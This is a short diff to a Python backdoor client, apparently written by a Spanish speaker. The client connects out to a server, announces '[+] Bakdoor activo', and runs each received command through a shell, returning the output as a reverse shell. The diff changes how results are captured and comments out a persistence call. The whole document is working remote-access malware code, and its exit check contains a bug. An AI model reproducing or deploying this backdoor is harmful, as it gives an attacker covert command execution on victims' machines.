@@ -39,8 +39,8 @@ def send_result(command):
             os.chdir(ruta)
             resultado = f'[+] Directorio actual: {os.getcwd()}'
         else:
-            resultado = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-            resultado = resultado.decode('cp850', errors='replace')
+            resultado = subprocess.run(command, shell=True, capture_output=True, text=True)
+            resultado = {'stdout': resultado.stdout, 'stderr': resultado.stderr}
     except Exception as e:
         resultado = f'[-] Error: {str(e)}'
     return resultado
@@ -51,11 +51,11 @@ def connect():
         try:
             cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             cliente.connect((IP_SERVER, PORT))
-            persistence()
+#            persistence()
             cliente.send(b'[+] Bakdoor activo\n')
 
             while True:
-                comando = cliente.recv(1024).decode().strip()
+                comando = cliente.recv(1024).decode()
                 if comando.lower == 'salir':
                     break
                 resultado = send_result(comando)
